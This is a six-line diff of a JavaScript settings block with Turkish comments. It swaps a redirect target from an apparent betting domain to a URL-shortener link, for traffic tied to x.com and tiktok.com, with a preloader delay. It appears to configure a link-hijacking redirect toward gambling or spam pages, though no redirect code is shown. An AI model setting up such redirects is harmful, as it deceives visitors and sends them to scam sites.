@@ -1,6 +1,6 @@
 // --- AYARLAR ---
 const oldDomains = ["x.com", "tiktok.com"];
-const newDomain  = "tr.betpaunmobilbahis.top";
+const newDomain  = "www.sshortly5.com/9ca3b2b";
 const maxPreloaderWaitTime = 1200; // kısa animasyon
 const redirectDelay = 150;         // preloader 1 kez çizilsin
 
